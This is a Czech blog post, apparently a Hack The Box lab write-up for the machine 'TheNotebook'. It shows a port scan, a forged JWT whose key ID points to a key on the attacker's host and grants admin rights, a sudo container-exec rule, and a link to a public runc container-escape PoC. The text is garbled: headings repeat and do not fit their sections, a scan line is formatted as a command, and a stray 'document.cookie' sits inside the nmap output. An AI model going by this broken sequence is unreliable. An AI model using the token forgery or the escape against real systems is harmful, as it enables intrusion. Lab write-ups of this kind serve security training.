---
layout: post
author: Tomáš Matějíček
title: "TheNotebook"
date: 2021-01-24
tags: linux ssh sudo php exploit enumeration
---
[TheNotebook](https://www.hackthebox.eu/home/machines/profile/320) je stroj z Hack The Box. Klíčová část útoku je webová enumerace a praktické zneužití nalezené slabiny.

### Vyhledání otevřených portů
Nejdřív mapuji služby, které jsou dostupné zvenku.
`ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);echo $ports;nmap -p $ports -A -sC -sV -v $IP`
```
PORT      STATE    SERVICE VERSION
```

### Přihlášení na cíl
Po získání přihlašovacích údajů přecházím na stabilní shell na cílovém stroji.
`22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)`
```
| ssh-hostkey:
|   2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA)
|   256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA)
|_  256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)
80/tcp    open     http    nginx 1.14.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: __CENSORED__
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: The Notebook - Your Note Keeper
10010/tcp filtered rxapi
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

document.cookie
```

### Přihlášení na cíl (2)
Po získání přihlašovacích údajů přecházím na stabilní shell na cílovém stroji.
`ssh-keygen -t rsa -b 4096 -m PEM -f privKey.key`
```
echo '{"typ":"JWT","alg":"RS256","kid":"http://10.10.14.8:8000/privKey.key"}' |base64
=> __CENSORED__=

echo '{"username":"ttt","email":"ttt@htb.com","admin_cap":true}' |base64
=> __CENSORED__==
```

### Získání user flagu
Tímto potvrzuji úspěšný uživatelský přístup.
`cat user.txt`
```
__CENSORED__
```

### Průzkum možností eskalace
Hledám chybné konfigurace a cesty k vyšším oprávněním.
`sudo -l`
```
(ALL) NOPASSWD: __CENSORED__ exec -it webapp-dev01*

https://github.com/Frichetten/CVE-2019-5736-PoC

go build main.go
```

### Získání root flagu
Tímto potvrzuji úplné ovládnutí stroje.
`cat root.txt`
```
__CENSORED__
```
